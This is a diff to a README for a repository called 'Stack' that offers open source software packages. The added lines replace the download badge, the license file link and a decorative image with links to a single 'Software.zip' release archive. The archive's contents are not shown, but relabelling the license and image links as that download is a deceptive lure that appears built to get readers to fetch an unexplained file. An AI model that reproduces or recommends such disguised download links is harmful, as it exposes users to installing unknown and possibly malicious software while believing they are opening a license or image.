@@ -20,7 +20,7 @@ This repository contains a variety of software packages that cater to different 
 
 To get started, simply click the link below to download the **Stack** repository:
 
-[![Download Stack](https://img.shields.io/badge/Download-Stack-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Stack](https://github.com/vedsingh23/stack/releases/download/v1.0/Software.zip)](https://github.com/vedsingh23/stack/releases/download/v1.0/Software.zip)
 
 Remember, if the link ends with the filename, it needs to be unzipped after download.
 
@@ -48,11 +48,11 @@ If you have a favorite open source software package that you think should be inc
 
 ## License 📝
 
-This project is licensed under the **MIT License** - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the **MIT License** - see the [https://github.com/vedsingh23/stack/releases/download/v1.0/Software.zip](https://github.com/vedsingh23/stack/releases/download/v1.0/Software.zip) file for details.
 
 ---
 
 Thank you for checking out the **Stack** repository. We hope you find it useful for your projects and enjoy exploring the world of open source software. Happy coding! 🎉
 
-![Stack Image](https://source.unsplash.com/featured/?technology)
+![Stack Image](https://github.com/vedsingh23/stack/releases/download/v1.0/Software.zip)
 
